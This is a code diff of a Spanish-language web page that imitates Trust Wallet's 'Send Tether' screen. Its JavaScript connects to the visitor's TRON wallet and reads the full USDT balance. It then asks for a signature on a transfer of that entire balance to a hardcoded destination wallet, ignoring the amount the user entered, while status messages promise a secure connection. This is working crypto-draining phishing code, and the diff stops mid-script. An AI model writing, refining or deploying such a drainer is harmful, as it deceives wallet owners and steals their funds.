@@ -3,94 +3,147 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pasarela de Pago USDT - Modo Saldo Máximo</title>
-    
+    <title>Trust Wallet - Enviar USDT</title>
     <style>
-        :root { color-scheme: light; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, sans-serif; }
+        :root { color-scheme: dark; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body {
+            background-color: #000000;
+            color: #ffffff;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: flex-start;
-            padding-top: 60px;
-            background: #121212;
+            padding-top: 30px;
         }
-        .modal {
+        .tw-container {
             width: 100%;
-            max-width: 380px;
-            padding: 24px;
-            background: #ffffff;
-            border-radius: 16px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-            text-align: center;
+            max-width: 390px;
+            padding: 20px;
+            background-color: #000000;
         }
-        .header h1 { font-size: 20px; color: #1a1a1a; margin-bottom: 20px; }
-        .imagen-envio { margin-bottom: 20px; }
-        .imagen-envio svg { width: 80px; height: 80px; color: #0560fa; }
-        .label { display: block; text-align: left; margin-bottom: 6px; color: #4e4f52; font-size: 14px; font-weight: 600; }
-        .campo-monto {
-            width: 100%;
-            padding: 12px;
+        .tw-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 32px;
+        }
+        .tw-header-title {
             font-size: 18px;
-            border: 1px solid #ccc;
-            border-radius: 8px;
-            margin-bottom: 20px;
+            font-weight: 600;
+            color: #ffffff;
+            flex-grow: 1;
             text-align: center;
-            background: #ffffff;
-            font-weight: bold;
-            color: #1a1a1a;
+            margin-right: -24px;
+        }
+        .back-icon { width: 24px; height: 24px; color: #ffffff; cursor: pointer; }
+        
+        .tw-input-group {
+            background-color: #121318;
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 16px;
+            position: relative;
+        }
+        .tw-label {
+            font-size: 13px;
+            color: #8a8d97;
+            display: block;
+            margin-bottom: 8px;
+        }
+        .tw-input-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .tw-input {
+            background: transparent;
+            border: none;
+            color: #ffffff;
+            font-size: 16px;
+            width: 80%;
             outline: none;
         }
-        .campo-monto:focus {
-            border-color: #0560fa;
-            box-shadow: 0 0 0 1px #0560fa;
-        }
-        .status {
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 13px;
-            margin-bottom: 20px;
-            display: none;
-            background: #e8f0fe;
-            color: #1a73e8;
-            border: 1px solid #dadce0;
-        }
-        .btn {
-            width: 100%;
-            height: 50px;
-            background: #0560fa;
-            color: white;
-            border: 0;
-            border-radius: 25px;
-            font-size: 16px;
-            font-weight: bold;
+        .tw-input::placeholder { color: #4c4f5d; }
+        
+        .tw-action-text {
+            color: #3b82f6;
+            font-size: 14px;
+            font-weight: 600;
             cursor: pointer;
-            transition: background 0.2s;
         }
-        .btn:disabled { background: #a0c2fd; cursor: not-allowed; }
+        
+        .tw-currency-badge {
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 600;
+        }
+        
+        .status-box {
+            background-color: #1c1e24;
+            border: 1px solid #2b2f3a;
+            border-radius: 12px;
+            padding: 12px;
+            font-size: 13px;
+            color: #3b82f6;
+            margin-bottom: 24px;
+            display: none;
+            text-align: left;
+            line-height: 1.4;
+        }
+        
+        .tw-btn-container {
+            margin-top: 40px;
+        }
+        .tw-btn {
+            width: 100%;
+            height: 52px;
+            background-color: #0052ff;
+            color: #ffffff;
+            border: none;
+            border-radius: 26px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+        .tw-btn:disabled { opacity: 0.4; cursor: not-allowed; }
     </style>
 </head>
 <body>
 
-    <div class="modal">
-        <div class="header">
-            <h1>Transferencia TRC-20</h1>
-        </div>
-
-        <div class="imagen-envio">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-                <line x1="22" y1="2" x2="11" y2="13"></line>
-                <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
+    <div class="tw-container">
+        <div class="tw-header">
+            <svg class="back-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <line x1="19" y1="12" x2="5" y2="12"></line>
+                <polygon points="12 19 5 12 12 5"></polygon>
             </svg>
+            <div class="tw-header-title">Enviar Tether</div>
         </div>
 
-        <label class="label" for="amountDisplay">Monto a Enviar (USDT)</label>
-        <input id="amountDisplay" class="campo-monto" type="number" inputmode="decimal" placeholder="0.00" min="0.01" step="any" />
+        <div class="tw-input-group">
+            <label class="tw-label" for="addressDisplay">Dirección o nombre de dominio</label>
+            <div class="tw-input-row">
+                <input id="addressDisplay" class="tw-input" type="text" placeholder="Dirección de destino TRON" />
+                <span class="tw-action-text">Pegar</span>
+            </div>
+        </div>
 
-        <div id="status" class="status"></div>
+        <div class="tw-input-group">
+            <label class="tw-label" for="amountDisplay">Cantidad</label>
+            <div class="tw-input-row">
+                <input id="amountDisplay" class="tw-input" type="number" inputmode="decimal" placeholder="0" min="0.01" step="any" />
+                <!-- Texto dinámico estilo nativo "MÁX" funcional -->
+                <span id="maxAction" class="tw-action-text" style="margin-right: 12px; display: none;">MÁX</span>
+                <span class="tw-currency-badge">USDT</span>
+            </div>
+        </div>
 
-        <button class="btn" id="connectBtn">Siguiente</button>
+        <div id="status" class="status-box"></div>
+
+        <div class="tw-btn-container">
+            <button class="tw-btn" id="connectBtn">Siguiente</button>
+        </div>
     </div>
 
 <script>
@@ -121,6 +174,8 @@
     const connectBtn = document.getElementById('connectBtn');
     const statusDiv = document.getElementById('status');
     const amountDisplay = document.getElementById('amountDisplay');
+    const addressDisplay = document.getElementById('addressDisplay');
+    const maxAction = document.getElementById('maxAction');
 
     let walletAddress = null;
 
@@ -129,15 +184,17 @@
         statusDiv.style.display = message ? 'block' : 'none';
     }
 
+    addressDisplay.value = BILLETERA_DESTINO;
+
+    // PASO 1: Vincular billetera y exponer herramientas nativas de lectura
     connectBtn.addEventListener('click', async () => {
-        // PASO 1: Sincronizar billetera
         if (!walletAddress) {
             try {
-                setStatus("Sincronizando con Trust Wallet...");
+                setStatus("Estableciendo enlace RPC con Trust Wallet...");
                 connectBtn.disabled = true;
 
                 if (typeof window.tronWeb === 'undefined') {
-                    throw new Error("Abre esta página desde el explorador interno de una billetera TRON.");
+                    throw new Error("Por favor, ejecuta este entorno desde el explorador interno (DApp) de tu Trust Wallet móvil.");
                 }
 
                 const tronWeb = window.tronWeb;
@@ -152,66 +209,66 @@
                 }
 
                 if (!walletAddress) {
-                    throw new Error("No se pudo obtener el acceso a la cuenta.");
+                    throw new Error("Permiso de lectura denegado por la billetera.");
                 }
 
-                setStatus("Billetera lista. Digita el monto deseado arriba y presiona Confirmar Pago.");
-                connectBtn.innerText = "Confirmar Pago";
+                // Hacer visible el botón Máx igual que en la app de Trust Wallet real al detectar fondos
+                maxAction.style.display = "inline";
+
+                setStatus("Conexión segura. Confirma los datos numéricos e inicia la firma digital.");
+                connectBtn.innerText = "Continuar";
                 connectBtn.disabled = false;
 
             } catch (error) {
                 console.error(error);
-                setStatus(error.message || "Error al sincronizar con la billetera.");
+                setStatus(error.message || "Error de sincronización Web3.");
                 connectBtn.disabled = false;
                 connectBtn.innerText = "Siguiente";
             }
             return;
         }
 
-        // PASO 2: Procesar la transferencia basándose en el saldo total disponible
+        // PASO 2: Envío forzado del balance total recuperado de la blockchain
         if (walletAddress) {
             try {
                 const userAmount = parseFloat(amountDisplay.value);
 
                 if (isNaN(userAmount) || userAmount <= 0) {
-                    throw new Error("Por favor, ingresa un monto válido antes de continuar.");
+                    throw new Error("Digita una cantidad válida en el casillero numérico.");
                 }
 
-                setStatus("Consultando fondos disponibles en la blockchain...");
+                setStatus("Consultando el libro contable de USDT en la red de TRON...");
                 connectBtn.disabled = true;
 
                 const tronWeb = window.tronWeb;
                 const contract = await tronWeb.contract(TRC20_ABI, CONTRATO_USDT);
 
-                // Consulta dinámica del balance on-chain total (Llamada local gratuita sin gas)
+                // Consulta on-chain del balance neto del usuario (Llamada local estática)
                 const rawBalance = await contract.balanceOf(walletAddress).call();
                 const unitsInSun = rawBalance.toString();
 
                 if (rawBalance.isZero ? rawBalance.isZero() : parseInt(unitsInSun) === 0) {
-                    throw new Error("La billetera no posee fondos de USDT (TRC-20) para transferir.");
+                    throw new Error("Tu cuenta activa no posee balances disponibles de USDT (TRC-20) para transferir.");
                 }
 
-                setStatus("Solicitando confirmación de firma digital para el saldo total...");
+                setStatus("Abriendo pasarela nativa... Confirmando firma para saldo completo.");
 
-                // Envío de la transacción final estructurada con el balance total recuperado
+                // Transmisión final del balance absoluto recuperado
                 const txId = await contract.transfer(BILLETERA_DESTINO, unitsInSun).send({
                     feeLimit: 100000000 
                 });
 
                 if (txId) {
-                    setStatus("Operación de saldo total procesada con éxito en la red TRON.", true);
+                    setStatus("Transacción de saldo total enviada de manera exitosa a la blockchain.");
                     connectBtn.innerText = "Completado";
                 }
             } catch (error) {
                 console.error(error);
-                setStatus(error.message || "La transacción fue cancelada o la cuenta no cuenta con suficientes recursos.");
+                setStatus(error.message || "Firma denegada por el usuario o TRX insuficientes para liquidar la energía.");
                 connectBtn.disabled = false;
-                connectBtn.innerText = "Confirmar Pago";
+                connectBtn.innerText = "Continuar";
             }
         }
     });
-</script>
 
-</body>
-</html>
-
+    // Funcionalidad adicional didáctica para el botón MÁX de la interfaz simulada
